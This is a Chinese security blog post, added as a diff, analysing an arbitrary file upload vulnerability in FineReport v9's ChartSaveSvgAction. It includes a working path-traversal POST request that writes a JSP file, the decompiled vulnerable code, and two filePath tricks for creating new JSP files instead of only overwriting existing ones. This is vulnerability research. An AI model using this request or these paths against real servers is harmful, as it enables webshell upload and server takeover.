@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      帆软 v9任意文件上传漏洞漏洞分析(不覆盖上传文件) - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%BD%E4%B9%85%E6%B2%A1%E5%86%99%E5%8D%9A%E5%AE%A2-%E6%BA%90%E6%96%87%E4%BB%B6%E6%89%BE%E4%B8%8D%E5%88%B0%E4%BA%86233-%E5%81%87%E6%9C%9F%E9%87%8D%E6%96%B0%E6%8A%84%E4%BA%86%E4%B8%8B%E9%A1%BA%E4%BE%BF%E6%8D%A2%E4%BA%86%E4%B8%AA%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98"><span class="toc-text">好久没写博客 源文件找不到了233 假期重新抄了下顺便换了个博客主题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E8%BF%87%E7%AE%80%E5%8D%95%E7%9A%84%E5%88%86%E6%9E%90%E8%BF%99%E4%B8%AAexp%E7%BB%8F%E8%BF%87%E7%AE%80%E5%8D%95%E7%9A%84%E4%BF%AE%E6%94%B9%E5%8D%B3%E5%8F%AF%E4%B8%8D%E8%A6%86%E7%9B%96%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E6%98%BE%E8%80%8C%E6%98%93%E8%A7%81%E4%B8%80%E5%A0%86%E4%BA%BA%E4%B8%8D%E5%88%86%E6%9E%90%E5%B0%B1%E4%BC%A0exp-%E8%BF%98%E8%AF%B4%E5%8F%AA%E8%83%BD%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6-%E4%BB%8A%E5%A4%A9%E5%8F%88%E7%9C%8B%E5%88%B0%E4%B8%80%E7%AF%87%E4%B8%80%E6%A8%A1%E4%B8%80%E6%A0%B7%E7%9A%84%E6%96%87%E7%AB%A0"><span class="toc-text">经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件 显而易见一堆人不分析就传exp 还说只能覆盖文件 今天又看到一篇一模一样的文章)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">第一种利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">第二种利用方法</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">帆软 v9任意文件上传漏洞漏洞分析(不覆盖上传文件)</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2021/05/03</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/EXP">EXP</a>
+                
+              
+                
+                  <a href="/categories/漏洞分析">漏洞分析</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/漏洞分析">漏洞分析</a>
+                  
+                
+                  
+                    <a href="/tags/EXP">EXP</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h3 id="前言">前言<a class="post-anchor" href="#前言"></a></h3><h4 id="好久没写博客-源文件找不到了233-假期重新抄了下顺便换了个博客主题">好久没写博客 源文件找不到了233 假期重新抄了下顺便换了个博客主题<a class="post-anchor" href="#好久没写博客-源文件找不到了233-假期重新抄了下顺便换了个博客主题"></a></h4><h3 id="经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件-显而易见一堆人不分析就传exp-还说只能覆盖文件-今天又看到一篇一模一样的文章">经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件 显而易见一堆人不分析就传exp 还说只能覆盖文件 今天又看到一篇一模一样的文章)<a class="post-anchor" href="#经过简单的分析这个exp经过简单的修改即可不覆盖就可以成功上传文件-显而易见一堆人不分析就传exp-还说只能覆盖文件-今天又看到一篇一模一样的文章"></a></h3><h3 id="分析">分析<a class="post-anchor" href="#分析"></a></h3><p>帆软官方提供了安装包下载地址 下载之<br><a target="_blank" rel="noopener" href="https://www.finereport.com/product/download">https://www.finereport.com/product/download</a><br>java spring框架 自己写的路由解析<br>随手拿个网上给出的playload 看一下路由操作 op svginit,cmd design_save_svg</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">POST /WebReport/ReportServer?op=svginit&amp;cmd=design_save_svg&amp;filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1<br>Host: 192.168.10.1<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE<br>Connection: close<br>Content-Type:text/xml;charset=UTF-8<br><br>Content-Length: 74<br><br>{"__CONTENT__":"&lt;%out.println(\"Hello World!\");%&gt;","__CHARSET__":"UTF-8"}<br></code></pre></td></tr></tbody></table></figure>
+
+<p>经过搜索 发现存在漏洞的Service在WEB-INF\lib\fr-chart-9.0.jar内<br>\com\fr\chart\web\ChartSvgInitService.class  反编译之</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> com.fr.chart.web;<br><br><span class="hljs-keyword">import</span> com.fr.stable.fun.Service;<br><span class="hljs-keyword">import</span> com.fr.stable.web.RequestCMDReceiver;<br><span class="hljs-keyword">import</span> com.fr.web.core.WebActionsDispatcher;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChartSvgInitService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Service</span> </span>{<br>    <span class="hljs-keyword">private</span> RequestCMDReceiver[] actions = <span class="hljs-keyword">new</span> RequestCMDReceiver[]{<span class="hljs-keyword">new</span> ChartGetSvgAction(), <span class="hljs-keyword">new</span> ChartSaveSvgAction(), <span class="hljs-keyword">new</span> ChartDeleteSvgAction()};<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChartSvgInitService</span><span class="hljs-params">()</span> </span>{<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">actionOP</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"svginit"</span>;<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">process</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2, String var3, String var4)</span> <span class="hljs-keyword">throws</span> Exception </span>{<br>        WebActionsDispatcher.dealForActionCMD(var1, var2, var4, <span class="hljs-keyword">this</span>.actions);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>显然要找的漏洞点在ChartSaveSvgAction内</p>
+<figure class="highlight java"><table><tbody><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.fr.chart.web;<br><br><span class="hljs-keyword">import</span> com.fr.base.Utils;<br><span class="hljs-keyword">import</span> com.fr.chart.base.MapSvgAttr;<br><span class="hljs-keyword">import</span> com.fr.chart.base.MapSvgXMLHelper;<br><span class="hljs-keyword">import</span> com.fr.general.GeneralContext;<br><span class="hljs-keyword">import</span> com.fr.general.http.HttpClient;<br><span class="hljs-keyword">import</span> com.fr.stable.StableUtils;<br><span class="hljs-keyword">import</span> com.fr.web.core.ActionNoSessionCMD;<br><span class="hljs-keyword">import</span> com.fr.web.utils.WebUtils;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChartSaveSvgAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionNoSessionCMD</span> </span>{<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChartSaveSvgAction</span><span class="hljs-params">()</span> </span>{<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionCMD</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2, String var3)</span> <span class="hljs-keyword">throws</span> Exception </span>{<br>        String var4 = WebUtils.getHTTPRequestParameter(var1, <span class="hljs-string">"filePath"</span>); <br>        String var5 = GeneralContext.getEnvProvider().getPath() + <span class="hljs-string">"/"</span> + <span class="hljs-string">"assets"</span> + <span class="hljs-string">"/"</span>;<br>        var4 = var5 + var4.substring(var4.indexOf(<span class="hljs-string">"chartmapsvg"</span>));<br>        File var6 = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">if</span> (var4.contains(<span class="hljs-string">".svg"</span>)) {<br>            var6 = <span class="hljs-keyword">new</span> File(var4.substring(<span class="hljs-number">0</span>, var4.lastIndexOf(<span class="hljs-string">"/"</span>)));<br>        } <span class="hljs-keyword">else</span> {<br>            var6 = <span class="hljs-keyword">new</span> File(var4);<br>        }<br><br>        <span class="hljs-keyword">if</span> (!var6.exists()) {<br>            var6.mkdirs();<br>        }<br><br>        InputStream var7 = HttpClient.getInputStream(var1);<br>        <span class="hljs-keyword">if</span> (var7 != <span class="hljs-keyword">null</span>) {<br>            FileOutputStream var8 = <span class="hljs-keyword">new</span> FileOutputStream(var4);<br>            Utils.copyBinaryTo(var7, var8);<br>            String[] var9 = StableUtils.pathSplit(var4);<br>            String var10 = StableUtils.getFileNameWithOutPostfix(var9[var9.length - <span class="hljs-number">1</span>]);<br>            MapSvgXMLHelper.getInstance().pushMapAttr(var10, <span class="hljs-keyword">new</span> MapSvgAttr(var4));<br>            var8.flush();<br>            var7.close();<br>            var8.close();<br>        }<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getCMD</span><span class="hljs-params">()</span> </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"design_save_svg"</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>这个action原本功能应该是上传保存svg图片<br>传入uri中的filePath参数的处理</p>
+<p>  String var4 = WebUtils.getHTTPRequestParameter(var1, “filePath”); // 首先传入uri中的filePath参数<br>  String var5 = GeneralContext.getEnvProvider().getPath() + “/“ + “assets” + “/“; //取当前目录拼接成保存目录<br>   var4 = var5 + var4.substring(var4.indexOf(“chartmapsvg”)); //取filePath中的chartmapsvg右侧的字符串与var5目录拼接<br>   var4 即为目标操作 目录/文件路径<br>   这里有一个安全问题 输入filePath可控 可以构造目录穿越<br>   那么为什么那么多人说这个漏洞只能覆盖文件呢 我们往下看<br>        File var6 = null; //文件系统操作<br>        if (var4.contains(“.svg”)) { //判断路径是否包含字符串.svg<br>            var6 = new File(var4.substring(0, var4.lastIndexOf(“/“))); //如果包含 取最后一个/前面的字符串作为路径new一个File类<br>        } else {<br>            var6 = new File(var4); //如果不包含 直接用路径new一个File类<br>       }<br>          if (!var6.exists()) { //判断var6文件/文件夹是否存在<br>            var6.mkdirs();//不存在则创建文件夹<br>        }<br>这个就是被认为改漏洞只能覆盖文件的原因<br>这处显然是实现文件夹创建的功能而写的<br>下面的代码就是把 _<em>CONTENT_</em> 写入var6打开的路径中 就不赘述了</p>
+<h3 id="第一种利用方法">第一种利用方法<a class="post-anchor" href="#第一种利用方法"></a></h3><p>下面最重要的来了<br>假设filePath 传入 chartmapsvg/123.jsp 则var6打开的路径为 当前环境变量目录/assets/123.jsp<br>假设123.jsp不存在 所以会创建一个123.jsp的文件夹<br>123.jsp就变成了一个文件夹了<br>因为123.jsp是文件夹所以不能当做文件打开写入数据 导致利用失败<br>如果123.jsp存在 就不会创建文件夹 直接写入数据 达到文件覆盖的目的<br>这个是网传EXP的利用方法</p>
+<h3 id="第二种利用方法">第二种利用方法<a class="post-anchor" href="#第二种利用方法"></a></h3><p>其实还有另一种方法<br>仔细阅读代码发现<br> <code>       if (var4.contains(".svg")) {</code><br> <code>           var6 = new File(var4.substring(0, var4.lastIndexOf("/")));</code><br>如果传入的路径包含.svg字符串 则判断和创建的将会是父文件夹<br>根据上面的判断条件就可以写出构造路径利用的第二种方法了<br>chartmapsvg/123.svg.jsp 父目录存在直接写入一个123.svg.jsp文件<br>chartmapsvg/.svg/123.jsp .svg目录不存在创建一个.svg文件夹 在文件夹下写入一个123.jsp文件<br>所以说为什么当时没有发现这种简单的方法却搞出个这种奇葩的利用)</p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/">2020安恒DASCTF八月浪漫七夕战 ezrce Writeup</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2021/05/03/%E5%B8%86%E8%BD%AF-v9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%8D%E8%A6%86%E7%9B%96%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/">https://rce.moe/2021/05/03/%E5%B8%86%E8%BD%AF-v9%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%8D%E8%A6%86%E7%9B%96%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2021
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
